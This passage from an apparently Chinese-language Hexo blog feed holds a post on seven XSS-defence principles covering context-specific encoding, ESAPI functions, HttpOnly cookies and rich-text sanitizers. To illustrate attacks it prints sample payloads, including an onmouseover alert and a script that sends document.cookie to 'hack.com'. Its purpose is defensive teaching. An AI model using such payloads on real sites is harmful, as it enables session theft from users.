rel="external">https://github.com/estree/estree/blob/master/spec.md</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Mozilla/Projects/SpiderMonkey/Parser_API" target="_blank" rel="external">https://developer.mozilla.org/en-US/docs/Mozilla/Projects/SpiderMonkey/Parser_API</a></li><li><a href="http://jointjs.com/demos/javascript-ast" target="_blank" rel="external">http://jointjs.com/demos/javascript-ast</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;Javascript 作为一种运行在客户端的脚本语言，其源代码对用户来说是完全可见的。但不是每一个 js 开发者都希望自己的代码能被直接阅读
      
    
    </summary>
    
      <category term="前端" scheme="http://yoursite.com/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="JavaScript" scheme="http://yoursite.com/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>防御XSS攻击的七条原则</title>
    <link href="http://yoursite.com/2017/01/03/%E9%98%B2%E5%BE%A1XSS%E6%94%BB%E5%87%BB%E7%9A%84%E4%B8%83%E6%9D%A1%E5%8E%9F%E5%88%99/"/>
    <id>http://yoursite.com/2017/01/03/防御XSS攻击的七条原则/</id>
    <published>2017-01-03T09:30:20.000Z</published>
    <updated>2017-11-12T14:12:54.770Z</updated>
    
    <content type="html"><![CDATA[<p>攻击者可以利用XSS漏洞向用户发送攻击脚本，而用户的浏览器因为没有办法知道这段脚本是不可信的，所以依然会执行它。对于浏览器而言，它认为这段脚本是来自可以信任的服务器的，所以脚本可以光明正大地访问Cookie，或者保存在浏览器里被当前网站所用的敏感信息，甚至可以知道用户电脑安装了哪些软件。这些脚本还可以改写HTML页面，进行钓鱼攻击。</p><p>虽然产生XSS漏洞的原因各种各样，对于漏洞的利用也是花样百出，但是如果我们遵循本文提到防御原则，我们依然可以做到防止XSS攻击的发生。</p><p>有人可能会问，防御XSS的核心不就是在输出不可信数据的时候进行编码，而现如今流行的Web框架（比如Rails）大多都在默认情况下就对不可信数据进行了HTML编码，帮我们做了防御，还用得着我们自己再花时间研究如何防御XSS吗？答案是肯定的，对于将要放置到HTML页面body里的不可信数据，进行HTML编码已经足够防御XSS攻击了，甚至将HTML编码后的数据放到HTML标签（TAG）的属性（attribute）里也不会产生XSS漏洞（但前提是这些属性都正确使用了引号），但是，如果你将HTML编码后的数据放到了<script>标签里的任何地方，甚至是HTML标签的事件处理属性里（如onmouseover），又或者是放到了CSS、URL里，XSS攻击依然会发生，在这种情况下，HTML编码不起作用了。所以就算你到处使用了HTML编码，XSS漏洞依然可能存在。下面这几条规则就将告诉你，如何在正确的地方使用正确的编码来消除XSS漏洞。</p><h3 id="原则1：不要在页面中插入任何不可信数据，除非这些数已经据根据下面几个原则进行了编码"><a href="#原则1：不要在页面中插入任何不可信数据，除非这些数已经据根据下面几个原则进行了编码" class="headerlink" title="原则1：不要在页面中插入任何不可信数据，除非这些数已经据根据下面几个原则进行了编码"></a>原则1：不要在页面中插入任何不可信数据，除非这些数已经据根据下面几个原则进行了编码</h3><p>第一条原则其实是“Secure By Default”原则：不要往HTML页面中插入任何不可信数据，除非这些数据已经根据下面几条原则进行了编码。</p><p>之所以有这样一条原则存在，是因为HTML里有太多的地方容易形成XSS漏洞，而且形成漏洞的原因又有差别，比如有些漏洞发生在HTML标签里，有些发生在HTML标签的属性里，还有的发生在页面的<Script>里，甚至有些还出现在CSS里，再加上不同的浏览器对页面的解析或多或少有些不同，使得有些漏洞只在特定浏览器里才会产生。如果想要通过XSS过滤器（XSS Filter）对不可信数据进行转义或替换，那么XSS过滤器的过滤规则将会变得异常复杂，难以维护而且会有被绕过的风险。</p><p>所以实在想不出有什么理由要直接往HTML页面里插入不可信数据，就算是有XSS过滤器帮你做过滤，产生XSS漏洞的风险还是很高</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;…不要在这里直接插入不可信数据…&lt;<span class="regexp">/script&gt;直接插入到SCRIPT标签里 </span></div><div class="line"><span class="regexp">&lt;!– …不要在这里直接插入不可信数据… –&gt;</span></div><div class="line"><span class="regexp">插入到HTML注释里</span></div><div class="line"><span class="regexp"> </span></div><div class="line"><span class="regexp">&lt;div 不要在这里直接插入不可信数据=”…”&gt;&lt;/</span>div&gt;</div><div class="line">插入到HTML标签的属性名里</div><div class="line"> </div><div class="line">&lt;div name=”…不要在这里直接插入不可信数据…”&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></div><div class="line">插入到HTML标签的属性值里</div><div class="line"> </div><div class="line">&lt;不要在这里直接插入不可信数据 href=”…”&gt;<span class="xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></div><div class="line">作为HTML标签的名字</div><div class="line"> </div><div class="line">&lt;style&gt;…不要在这里直接插入不可信数据…&lt;<span class="regexp">/style&gt;</span></div><div class="line"><span class="regexp">直接插入到CSS里</span></div></pre></td></tr></table></figure><p>最重要的是，千万不要引入任何不可信的第三方JavaScript到页面里，一旦引入了，这些脚本就能够操纵你的HTML页面，窃取敏感信息或者发起钓鱼攻击等等。</p><h3 id="原则2：在将不可信数据插入到HTML标签之间时，对这些数据进行HTML-Entity编码"><a href="#原则2：在将不可信数据插入到HTML标签之间时，对这些数据进行HTML-Entity编码" class="headerlink" title="原则2：在将不可信数据插入到HTML标签之间时，对这些数据进行HTML Entity编码"></a>原则2：在将不可信数据插入到HTML标签之间时，对这些数据进行HTML Entity编码</h3><p>在这里相当强调是往HTML标签之间插入不可信数据，以区别于往HTML标签属性部分插入不可信数据，因为这两者需要进行不同类型的编码。当你确实需要往HTML标签之间插入不可信数据的时候，首先要做的就是对不可信数据进行HTML Entity编码。比如，我们经常需要往DIV，P，TD这些标签里放入一些用户提交的数据，这些数据是不可信的，需要对它们进行HTML Entity编码。很多Web框架都提供了HTML Entity编码的函数，我们只需要调用这些函数就好，而有些Web框架似乎更“智能”，比如Rails，它能在默认情况下对所有插入到HTML页面的数据进行HTML Entity编码，尽管不能完全防御XSS，但着实减轻了开发人员的负担。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;body&gt;…插入不可信数据前，对其进行HTML Entity编码…&lt;<span class="regexp">/body&gt;&lt;div&gt;…插入不可信数据前，对其进行HTML Entity编码…&lt;/</span>div&gt;<span class="xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>…插入不可信数据前，对其进行HTML Entity编码…<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></div><div class="line">以此类推，往其他HTML标签之间插入不可信数据前，对其进行HTML Entity编码</div></pre></td></tr></table></figure><p><strong> [编码规则] </strong><br>那么HTML Entity编码具体应该做哪些事情呢？它需要对下面这6个特殊字符进行编码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&amp;     –&gt;     &amp;amp;</div><div class="line">&lt;     –&gt;     &amp;lt;</div><div class="line">&gt;     –&gt;     &amp;gt;</div><div class="line">”     –&gt;     &amp;quot;</div><div class="line">‘     –&gt;     <span class="string">'</span></div><div class="line"><span class="string">/     –&gt;     /</span></div></pre></td></tr></table></figure><p>有两点需要特别说明的是:</p><ul><li>不推荐将单引号( ‘ )编码为 &apos; 因为它并不是标准的HTML标签</li><li>需要对斜杠号( / )编码，因为在进行XSS攻击时，斜杠号对于关闭当前HTML标签非常有用</li></ul><p>推荐使用OWASP提供的ESAPI函数库，它提供了一系列非常严格的用于进行各种安全编码的函数。在当前这个例子里，你可以使用:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">String</span> encodedContent = ESAPI.encoder().encodeForHTML(request.getParameter(“input”));</div></pre></td></tr></table></figure><h3 id="原则3：在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码"><a href="#原则3：在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码" class="headerlink" title="原则3：在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码"></a>原则3：在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码</h3><p>这条原则是指，当你要往HTML属性（例如width、name、value属性）的值部分(data value)插入不可信数据的时候，应该对数据进行HTML属性编码。不过需要注意的是，当要往HTML标签的事件处理属性（例如onmouseover）里插入数据的时候，本条原则不适用，应该用下面介绍的原则4对其进行JavaScript编码。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;div attr=…插入不可信数据前，进行HTML属性编码…&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>属性值部分没有使用引号，不推荐 </div><div class="line">&lt;div attr=’…插入不可信数据前，进行HTML属性编码…’&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></div><div class="line">属性值部分使用了单引号</div><div class="line">&lt;div attr=”…插入不可信数据前，进行HTML属性编码…”&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></div><div class="line">属性值部分使用了双引号</div></pre></td></tr></table></figure></p><p><strong> [编码规则] </strong><br>除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 &#xHH; （以&amp;#x开头，HH则是指该字符对应的十六进制数字，分号作为结束符）</p><p>之所以编码规则如此严格，是因为开发者有时会忘记给属性的值部分加上引号。如果属性值部分没有使用引号的话，攻击者很容易就能闭合掉当前属性，随后即可插入攻击脚本。例如，如果属性没有使用引号，又没有对数据进行严格编码，那么一个空格符就可以闭合掉当前属性。请看下面这个攻击：</p><p>假设HTML代码是这样的：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">width</span>=<span class="string">$INPUT</span>&gt;</span> …content… <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure><p>攻击者可以构造这样的输入：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">x onmouseover=”javascript:alert(/xss/)”</div></pre></td></tr></table></figure></p><p>最后，在用户的浏览器里的最终HTML代码会变成这个样子：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&amp;lt;div width=x onmouseover=”javascript:alert(/xss/)”&amp;gt; …content… &amp;lt;/div&amp;gt;</div></pre></td></tr></table></figure></p><p>只要用户的鼠标移动到这个DIV上，就会触发攻击者写好的攻击脚本。在这个例子里，脚本仅仅弹出一个警告框，除了恶作剧一下也没有太多的危害，但是在真实的攻击中，攻击者会使用更加具有破坏力的脚本，例如下面这个窃取用户cookie的XSS攻击：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">x /&gt; <span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(“img”);img.src = ”http:<span class="comment">//hack.com/xss.js?” + escape(document.cookie);document.body.appendChild(img);</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span> &lt;div</div></pre></td></tr></table></figure><p>除了空格符可以闭合当前属性外，这些符号也可以：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%     *     +     ,     –     /     ;     <span class="xml"><span class="tag">&lt;     =     &gt;</span>     ^     |     `(反单引号，IE会认为它是单引号)</span></div></pre></td></tr></table></figure><p>可以使用ESAPI提供的函数进行HTML属性编码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">String</span> encodedContent = ESAPI.encoder().encodeForHTMLAttribute(request.getParameter(“input”));</div></pre></td></tr></table></figure></p><h3 id="原则4：在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码"><a href="#原则4：在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码" class="headerlink" title="原则4：在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码"></a>原则4：在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码</h3><p>这条原则主要针对动态生成的JavaScript代码，这包括脚本部分以及HTML标签的事件处理属性（Event Handler，如onmouseover, onload等）。在往JavaScript代码里插入数据的时候，只有一种情况是安全的，那就是对不可信数据进行JavaScript编码，并且只把这些数据放到使用引号包围起来的值部分（data value）之中，例如：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&amp;lt;script&amp;gt;</div><div class="line">    <span class="keyword">var</span> message = “&amp;lt;%= encodeJavaScript(@INPUT) %&amp;gt;”;</div><div class="line">&amp;lt;<span class="regexp">/script&amp;gt;</span></div></pre></td></tr></table></figure></p><p>除此之外，往JavaScript代码里其他任何地方插入不可信数据都是相当危险的，攻击者可以很容易地插入攻击代码。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(‘…插入不可信数据前，进行JavaScript编码…’)&lt;<span class="regexp">/script&gt;值部分使用了单引号 </span></div><div class="line"><span class="regexp">&lt;script&gt;x = “…插入不可信数据前，进行JavaScript编码…”&lt;/</span>script&gt;</div><div class="line">值部分使用了双引号</div><div class="line">&lt;div onmouseover=”x=’…插入不可信数据前，进行JavaScript编码…’ “&lt;<span class="regexp">/div&gt;</span></div><div class="line"><span class="regexp">值部分使用了引号，且事件处理属性的值部分也使用了引号</span></div><div class="line"><span class="regexp">特别需要注意的是，在XSS防御中，有些JavaScript函数是极度危险的，就算对不可信数据进行JavaScript编码，也依然会产生XSS漏洞，例如：</span></div><div class="line"><span class="regexp">&lt;script&gt;</span></div><div class="line"><span class="regexp">window.setInterval(‘…就算对不可信数据进行了JavaScript编码，这里依然会有XSS漏洞…’);</span></div><div class="line"><span class="regexp">&lt;/</span>script&gt;</div></pre></td></tr></table></figure><p><strong>[编码规则]</strong><br>除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 \xHH （以 \x 开头，HH则是指该字符对应的十六进制数字）</p><p>在对不可信数据做编码的时候，千万不能图方便使用反斜杠（ \ ）对特殊字符进行简单转义，比如将双引号 ” 转义成 \” ，这样做是不可靠的，因为浏览器在对页面做解析的时候，会先进行HTML解析，然后才是JavaScript解析，所以双引号很可能会被当做HTML字符进行HTML解析，这时双引号就可以突破代码的值部分，使得攻击者可以继续进行XSS攻击。例如：</p><p>假设代码片段如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line"><span class="keyword">var</span> message = ” $VAR “;</div><div class="line">&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure></p><p>攻击者输入的内容为：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">\”; alert(‘xss’);<span class="comment">//</span></div></pre></td></tr></table></figure></p><p>如果只是对双引号进行简单转义，将其替换成 \” 的话，攻击者输入的内容在最终的页面上会变成：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line"><span class="keyword">var</span> message = ” \\”; alert(‘xss’);<span class="comment">// “;</span></div><div class="line">&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure><p>浏览器在解析的时候，会认为反斜杠后面的那个双引号和第一个双引号相匹配，继而认为后续的alert(‘xss’)是正常的JavaScript脚本，因此允许执行。</p><p>可以使用ESAPI提供的函数进行JavaScript编码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">String</span> encodedContent = ESAPI.encoder().encodeForJavaScript(request.getParameter(“input”));</div></pre></td></tr></table></figure><h3 id="原则5：在将不可信数据插入到Style属性里时，对这些数据进行CSS编码"><a href="#原则5：在将不可信数据插入到Style属性里时，对这些数据进行CSS编码" class="headerlink" title="原则5：在将不可信数据插入到Style属性里时，对这些数据进行CSS编码"></a>原则5：在将不可信数据插入到Style属性里时，对这些数据进行CSS编码</h3><p>当需要往Stylesheet，Style标签或者Style属性里插入不可信数据的时候，需要对这些数据进行CSS编码。传统印象里CSS不过是负责页面样式的，但是实际上它比我们想象的要强大许多，而且还可以用来进行各种攻击。因此，不要对CSS里存放不可信数据掉以轻心，应该只允许把不可信数据放入到CSS属性的值部分，并进行适当的编码。除此以外，最好不要把不可信数据放到一些复杂属性里，比如url, behavior等，只能被IE认识的Expression属性允许执行JavaScript脚本，因此也不推荐把不可信数据放到这里。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;style&gt;selector &#123; <span class="attr">property</span> : …插入不可信数据前，进行CSS编码…&#125; &lt;<span class="regexp">/style&gt;&lt;style&gt;selector &#123; property : ” …插入不可信数据前，进行CSS编码… “&#125; &lt;/</span>style&gt;</div><div class="line">&lt;span style=” property : …插入不可信数据前，进行CSS编码… ”&gt; … &lt;<span class="regexp">/span&gt;</span></div></pre></td></tr></table></figure></p><p><strong>[编码规则]</strong><br>除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 \HH （以 \ 开头，HH则是指该字符对应的十六进制数字）</p><p>同原则2，原则3，在对不可信数据进行编码的时候，切忌投机取巧对双引号等特殊字符进行简单转义，攻击者可以想办法绕开这类限制。</p><p>可以使用ESAPI提供的函数进行CSS编码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">String</span> encodedContent = ESAPI.encoder().encodeForCSS(request.getParameter(“input”));</div></pre></td></tr></table></figure><h3 id="原则6：在将不可信数据插入到HTML-URL里时，对这些数据进行URL编码"><a href="#原则6：在将不可信数据插入到HTML-URL里时，对这些数据进行URL编码" class="headerlink" title="原则6：在将不可信数据插入到HTML URL里时，对这些数据进行URL编码"></a>原则6：在将不可信数据插入到HTML URL里时，对这些数据进行URL编码</h3><p>当需要往HTML页面中的URL里插入不可信数据的时候，需要对其进行URL编码，如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">”http://www.abcd.com?param</span>=<span class="string">…插入不可信数据前，进行URL编码…”</span>&gt;</span> Link Content <span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure><p><strong>[编码规则]</strong><br>除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 %HH （以 % 开头，HH则是指该字符对应的十六进制数字）</p><p>在对URL进行编码的时候，有两点是需要特别注意的：<br>1) URL属性应该使用引号将值部分包围起来，否则攻击者可以很容易突破当前属性区域，插入后续攻击代码<br>2) 不要对整个URL进行编码，因为不可信数据可能会被插入到href, src或者其他以URL为基础的属性里，这时需要对数据的起始部分的协议字段进行验证，否则攻击者可以改变URL的协议，例如从HTTP协议改为DATA伪协议，或者javascript伪协议。</p><p>可以使用ESAPI提供的函数进行URL编码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">String</span> encodedContent = ESAPI.encoder().encodeForURL(request.getParameter(“input”));</div></pre></td></tr></table></figure><p>ESAPI还提供了一些用于检测不可信数据的函数，在这里我们可以使用其来检测不可信数据是否真的是一个URL：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">String</span> userProvidedURL = request.getParameter(“userProvidedURL”);boolean isValidURL = ESAPI.validator().isValidInput(“URLContext”, userProvidedURL, “URL”, <span class="number">255</span>, <span class="literal">false</span>); </div><div class="line"><span class="keyword">if</span> (isValidURL) &#123;</div><div class="line">&lt;a href=”&lt;%= encoder.encodeForHTMLAttribute(userProvidedURL) %&gt;”&gt;<span class="xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="原则7：使用富文本时，使用XSS规则引擎进行编码过滤"><a href="#原则7：使用富文本时，使用XSS规则引擎进行编码过滤" class="headerlink" title="原则7：使用富文本时，使用XSS规则引擎进行编码过滤"></a>原则7：使用富文本时，使用XSS规则引擎进行编码过滤</h3><p>Web应用一般都会提供用户输入富文本信息的功能，比如BBS发帖，写博客文章等，用户提交的富文本信息里往往包含了HTML标签，甚至是JavaScript脚本，如果不对其进行适当的编码过滤的话，则会形成XSS漏洞。但我们又不能因为害怕产生XSS漏洞，所以就不允许用户输入富文本，这样对用户体验伤害很大。</p><p>针对富文本的特殊性，我们可以使用XSS规则引擎对用户输入进行编码过滤，只允许用户输入安全的HTML标签，如<b>, <i>, <p>等，对其他数据进行HTML编码。需要注意的是，经过规则引擎编码过滤后的内容只能放在<div>, <p>等安全的HTML标签里，不要放到HTML标签的属性值里，更不要放到HTML事件处理属性里，或者放到<SCRIPT>标签里。</p><p>推荐XSS规则过滤引擎：OWASP AntiSamp或者Java HTML Sanitizer</p><p>总结</p><p>由于很多地方都可能产生XSS漏洞，而且每个地方产生漏洞的原因又各有不同，所以对于XSS的防御来说，我们需要在正确的地方做正确的事情，即根据不可信数据将要被放置到的地方进行相应的编码，比如放到<div>标签之间的时候，需要进行HTML编码，放到<div>标签属性里的时候，需要进行HTML属性编码，等等。</p><p>XSS攻击是在不断发展的，上面介绍的几条原则几乎涵盖了Web应用里所有可能出现XSS的地方，但是我们仍然不能掉以轻心，为了让Web应用更加安全，我们还可以结合其他防御手段来加强XSS防御的效果，或者减轻损失：</p><p>对用户输入进行数据合法性验证，例如输入email的文本框只允许输入格式正确的email，输入手机号码的文本框只允许填入数字且格式需要正确。这类合法性验证至少需要在服务器端进行以防止浏览器端验证被绕过，而为了提高用户体验和减轻服务器压力，最好也在浏览器端进行同样的验证。</p><p>为Cookie加上HttpOnly标记。许多XSS攻击的目标就是窃取用户Cookie，这些Cookie里往往包含了用户身份认证信息（比如SessionId），一旦被盗，黑客就可以冒充用户身份盗取用户账号。窃取Cookie一般都会依赖JavaScript读取Cookie信息，而HttpOnly标记则会告诉浏览器，被标记上的Cookie是不允许任何脚本读取或修改的，这样即使Web应用产生了XSS漏洞，Cookie信息也能得到较好的保护，达到减轻损失的目的。</p><p>Web应用变得越来越复杂，也越来越容易产生各种漏洞而不仅限于XSS漏洞，没有银弹可以一次性解决所有安全问题，我们只能处处留意，针对不同的安全漏洞进行针对性的防御。</p></script></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;攻击者可以利用XSS漏洞向用户发送攻击脚本，而用户的浏览器因为没有办法知道这段脚本是不可信的，所以依然会执行它。对于浏览器而言，它认为这段脚本是来自可以信任的服务器的，所以脚本可以光明正大地访问Cookie，或者保存在浏览器里被当前网站所用的敏感信息，甚至可以知道用户电脑安
      
    
    </summary>
    
      <category term="其他" scheme="http://yoursite.com/categories/%E5%85%B6%E4%BB%96/"/>
    
    
      <category term="JavaScript" scheme="http://yoursite.com/tags/JavaScript/"/>
    
      <category term="安全" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
